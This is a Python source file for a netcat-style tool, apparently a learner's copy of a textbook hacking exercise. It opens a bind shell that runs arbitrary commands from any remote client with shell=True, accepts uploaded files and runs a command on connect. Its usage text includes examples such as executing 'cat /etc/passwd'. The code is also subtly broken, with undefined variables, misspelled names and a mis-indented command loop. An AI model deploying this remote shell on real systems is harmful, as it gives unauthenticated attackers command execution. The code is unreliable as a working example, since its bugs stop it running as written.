import socket
import threading
import sys
import getopt
import subprocess

listen        = False
command       = False
upload        = False
execute       = ""
target        = ""
upload_dest   = ""
port          = 0

def client_sender():
   
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print('start socket')
    try:
        #connections a target host
        client.connect((target,port))
        print('connect %s:%d'%(target,port))

        while True:
            #Now receving data comming
            recv_len=1
            response=""

            while recv_len:
                data        = client.recv(10000)
                recv_len    = len(data)
                response+=data

                if recv_len<10000:
                    break
            print(response)
            buffer =sys.stdin.readline()
            #buffer+="\r\n"
            client.send(buffer)
    except:
        print("[*]Exception!Exiting.")
        client.close()

def server_loop():
    global target
    #if is not define target,so we are listening all of port
    if not len(target):
        target = "0.0.0.0"
    server =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)

    while True:
        client_socket,addr=server.accept()
        #creat a thread process new connection client
        client_thread = threading.Thread(target=client_handler,\
                                         args=(client_socket,))
        client_thread.start()
def run_command(command):
    #Change the line
    command = command.rstrip()
    #excute command and output return
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT,\
                                         shell=True)
    except:
        output = "Failed to execute command.\r\n"
        
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    #check upload file
    if len(upload_dest):
        #read all of string word and write to target host
        #Continue reading data until there is no data
        file=""
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer+=data
        try:
            file_descriptor = open(upload_dest,"wb")
            file_descriptor.write(file_buffer)
            file.descriptor.close()
            #Confirm that the file has been written
            client_cocket.send("Successfully saved file to %s\r\n"%upload_dest)
        except:
            client_cocket.send("Failed to save file to %s\r\n"%upload_dest)
    #check command execute
            
    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    #if we need a command shell,so we should come in another loop

    if command:
        while True:
            #Pop up a window
            client_socket.send("<NC:#>")
            #now we recev file  until find a enter key
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer+=client_socket.recv(4096)
                if 'exit!' in cmd_buffer:
                    client_socket.close()
                    sys.exit()
                    break
                #return command output
                response = run_command(cmd_buffer)
                #return response data
                client_socket.send(response)

def usage():
    print("NC TOOL")
    print("")
    print("Usage:bhnet.py -t target_host -p port")
    print("-l --listen               - listen on [host]:[port] for \
incoming connections")
    print("-e --excute=file_to_run   - execute the given file upon\
receving a connections")
    print("-c --command              - initialize a command shell")
    print("-u --upload=destination   - upon receving connection upload a \
file and write to [destiination]")
    print("")
    print("")
    print("Examples:")
    print("bhnet.py -t 192.168.1.1 -p 5555 -l -c")
    print("bhnet.py -t 192.168.1.1 -p 5555 -l -u=c:\\target.exe")
    print("bhnet.py -t 192.168.1.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhnet.py -t 192.168.1.100 -p 135")
    sys.exit(0)



def main():
    global listen
    global port
    global execute
    global command
    global upload_dest
    global target

    if not len(sys.argv[1:]):
        usage()
    try:
        opts,args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",\
                                  ["help","listen","execute","target","port",\
                                   "command","upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen=True
        elif o in ("-e","--execute"):
            execute = a
        elif o in ("-c","--commandshell"):
            command = True
        elif o in ("-u","--upload"):
            upload_dest = a
        elif o in ("-t","--target"):
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"
    #we are whether it is listening or only enter from stand input send data?

    if not listen and len(target) and port >0:
        #s="connect to target:%s:%d"%(target,port)
        #buffer = input(s)
        #buffer = sys.stdin.read()
        client_sender()

    #we start listening and Ready to upload file and excute command
    #place a bounce shell
    #Depending on the above command options

    if listen:
        print('start listen....')
        server_loop()
if __name__ == '__main__':
    main()



                
            
        
